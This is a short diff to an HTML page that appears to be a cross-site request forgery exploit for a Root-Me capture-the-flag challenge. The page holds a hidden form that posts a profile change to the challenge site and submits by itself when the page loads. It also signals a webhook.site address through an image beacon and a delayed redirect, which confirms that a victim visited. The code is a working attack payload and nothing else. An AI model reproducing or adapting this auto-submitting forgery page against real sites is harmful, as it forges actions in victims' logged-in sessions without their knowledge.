@@ -1,12 +1,13 @@
 <html>
-  <body onload="document.frames[0].submit()">
-    <form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" enctype="multipart/form-data" method="POST">
+  <body>
+    <form id='evil' action="http://challenge01.root-me.org/web-client/ch22/?action=profile" enctype="multipart/form-data" method="POST">
       <input name="username" value="test">
       <input type="checkbox" name="status" checked>
     </form>
     <img src="https://webhook.site/ffa22a63-e517-4166-8d91-da9997e12d7f?visited_img" />
     <script>
       window.addEventListener('DOMContentLoaded', function () {
+        document.getElementById('evil').submit();
         setTimeout(() => document.location = 'https://webhook.site/ffa22a63-e517-4166-8d91-da9997e12d7f?visited', 4000);
       });
     </script>
